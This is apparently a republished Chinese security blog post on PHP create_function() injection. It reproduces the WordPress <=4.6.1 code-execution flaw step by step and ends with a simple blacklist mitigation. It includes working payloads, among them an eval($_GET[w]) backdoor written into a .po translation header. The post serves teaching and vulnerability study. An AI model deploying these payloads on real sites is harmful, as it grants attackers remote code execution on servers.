本文来自i春秋作者：[xiaoye](http://bbs.ichunqiu.com/thread-14485-1-1.html)

### 前言

最近天好冷，论坛也有点冷清~~，写篇文章吧。打算把php中的敏感点写成个系列，前面说了宽字节注入和php反序列，今天来看看一个不算很常见的函数的锅
------create_function()函数

### 一、函数定义

在PHP中使用create_function()创建匿名函数，seay大牛的解释很清楚，引用一下：

>   1. 获取参数, 函数体;
>
>   2. 拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;
>
>   3. eval;
>
>   4. 通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;
>
>   5. 定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;
>
>   6. 用新的函数名替换__lambda_func;
>
>   7. 返回新的函数。
>
>

其实我们只需要关注前三点即可，自己写个例子讲一下吧：

    
    
    <?php
    $id = $_GET['id'];
    $q = 'echo'.$id.'is'.$a.";";
    $sy = create_function('$a',$q);
    ?>

这个匿名函数相当于这样的创建函数过程:

    
    
    function niming($a){
           echo $id.'is'.$a;
    }

q所指向的字符串的值是匿名函数的函数体

正常情况下，我们会输入http://localhost/create_function.php?id=1
此类的url来进行访问，但是看了看上面的创建函数的过程，能不能做一些手脚呢？

### 二、函数漏洞利用

    
    
    http://localhost/create_function.php?id=1;}phpinfo();/*访问之：

![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/142817histi0o0ctmfrc4i.png)

woca，phpinfo()函数执行了！我们来分析一下执行过程，payload访问后相当于如下：

    
    
    function niming($a){
    echo 1;}phpinfo();/*.'is'.$a;
    }

这就解释通了吧，我们用;}闭合了函数，phpinfo();后的/*会注释掉之后的代码，而我们之前说过，create_function函数是调用了eval的，所以phpinfo()函数得以执行。

### 三、wp下代码执行漏洞的复现

复现下wordpress代码执行的漏洞，方便起见，读者可下载wp<=4.6.1的中文版（内置了中文语言包）复现安装不再多说了，别忘了安装之前建立个数据库就行，我们直接定位到漏洞产生处：
代码wp-includes/pomo/translations.php：
![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/135510gdh1awdwf122kknn.png)

代码如下：

    
    
    /**
             * Makes a function, which will return the right translation index, according to the
             * plural forms header
             * @param int    $nplurals
             * @param string $expression
             */
            function make_plural_form_function($nplurals, $expression) {
                    $expression = str_replace('n', '$n', $expression);
                    $func_body = "
                            \$index = (int)($expression);
                            return (\$index < $nplurals)? \$index : $nplurals - 1;";
                    return create_function('$n', $func_body);
            }

出现了create_function()函数，看看函数体可不可以利用：

    
    
    $func_body = "
    \$index = (int)($expression);
    return (\$index < $nplurals)? \$index : $nplurals - 1;";

可以看到$expression等参数并没有过滤，那么参数是从哪里传过来的呢？看看注释plural forms header 这是对字体文件的操作，参数来源于
wp-content\languages\zh_CN.po

![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/140557bzgvvec83bbzaghn.png)

"Plural-Forms: nplurals=1; plural=0这行就是上面的函数体接收的两个参数 那我们来修改一下：

    
    
    "Plural-Forms: nplurals=1; plural=0);}eval($_GET[w]);/*"

原理不用我多说了，和我前面举得例子基本一致： **);}闭合了函数，eval($_GET[x]);执行后门代码，/*注释后面代码，相当于：**

![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/150055ovp2b3tr8ulbb8cc.png)

p.s：用notepad++修改后，再用poedit程序打开保存，因为wp调用的是mo文件，是po文件编译后的执行文件，用poedit保存后才能编译更新mo文件（如下图设置：文件
--首选项--把保存自动编译mo文件勾选上，这样我们保存po文件即可编译mo文件供wp加载调用）。

![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/152208wty1b7r9f7wjyk41.png)

> 由于访问每个文件时都要用这个对字体文件解析的结果对文件进行翻译，所以我们访问任何文件都可以触发这个payload

别人复现时的解释，我们来看看执行情况：

![](http://bbs.ichunqiu.com/data/attachment/forum/201610/30/141643hqhu25x5qaqc1lku.png)

复现成功，代码执行了。

### 四、总结

关于wp<=4.6.1代码执行漏洞的复现过程都大同小异，给出参考： https://www.seebug.org/vuldb/ssvid-92459
读者嫌搭建环境麻烦，可以在i春秋试验机上做实验 http://www.ichunqiu.com/course/56013
重点还是理解create_function()函数的执行过程吧，要想避免此类的错误i，简单的方法可以做一个黑名单，过滤函数体中可控的变量 给出参考：

    
    
    $not_allowed = array(";", ")", "}");
    $experssion = str_replace($not_allowed, "", $expression);

文章就写到这里，吐槽一句，写文章的编辑器太坑，这是第二遍写这篇文章了。。

想了解更多网络信息安全技术相关的知识，请关注i春秋社区。
原文链接：http://bbs.ichunqiu.com/thread-14485-1-1.html

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/94/>

